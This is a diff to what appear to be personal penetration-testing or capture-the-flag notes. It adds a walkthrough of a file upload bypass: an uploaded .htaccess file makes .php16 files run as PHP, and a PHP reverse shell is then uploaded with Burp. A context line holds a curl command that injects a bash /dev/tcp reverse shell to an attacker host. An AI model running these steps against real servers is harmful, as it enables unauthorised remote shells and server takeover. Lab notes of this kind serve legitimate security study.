@@ -27,3 +27,25 @@ const command = `curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/${Ka
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
+## File Upload Bypass via .htaccess (php inclusion)
+
+Upload a normal text file and intercept the request with burp.
+
+To exploit the file upload bypass vulnerability, we renamed the malicious file to `.htaccess` and modified its content to include the following directive:
+
+```
+AddType application/x-httpd-php .php16
+```
+
+![[Pasted image 20260817214618.png]]
+
+This allows file.php16 to be uploaded
+
+Then upload phpreverseshell.php onto file upload button
+
+Intercept in burpsuite and change the filename to phpreverseshell.php16
+
+This will make pfpreverseshell.php16 appear in /uploads
